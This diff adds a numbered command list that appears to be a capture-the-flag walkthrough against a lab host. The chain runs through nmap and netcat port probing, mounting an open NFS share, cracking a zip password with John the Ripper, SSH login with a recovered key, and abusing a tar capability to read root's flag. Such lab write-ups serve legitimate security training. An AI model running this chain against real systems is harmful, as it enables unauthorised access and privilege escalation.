@@ -1,0 +1,16 @@
+1 - nmap -A 10.10.239.230
+2 - nc 10.10.239.230 1337
+3 - for i in {1..100}; do nc 10.10.239.230 $i; echo ""; done
+4 - nc 10.10.239.230 12345
+5 - sudo mount -t nfs 10.10.239.230: /tmp/tsfh
+6 - zip2john /tmp/tsfh/home/nfs/backup.zip > hash
+7 - john hash -w=/usr/share/wordlists/rockyou.txt
+8 - cat /home/hades/.ssh/flag.txt
+9 - cat /home/hades/.ssh/hint.txt
+10 - ssh -i id_rsa -p 3333 hades@10.10.239.230
+11 - exec '/bin/bash'
+12 - cat user.txt
+13 - getcap / -r 2>/dev/null
+14 - tar cf root.tar /root/root.txt
+15 - tar xf root.tar
+16 - cat root.txt
